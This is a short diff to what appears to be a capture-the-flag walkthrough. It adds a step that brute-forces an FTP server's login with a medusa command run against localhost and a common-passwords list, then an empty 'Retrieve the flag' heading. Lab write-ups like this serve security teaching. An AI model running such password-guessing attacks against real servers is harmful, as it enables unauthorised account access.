@@ -47,3 +47,12 @@ Getting the flag:
 
 **Step 4** - Targeting the FTP Server:
 
+* Brute-force the authentication mechanism:
+  * ```bash
+    medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+    ```
+    *
+
+
+
+**Step 5** - Retrieve the flag:
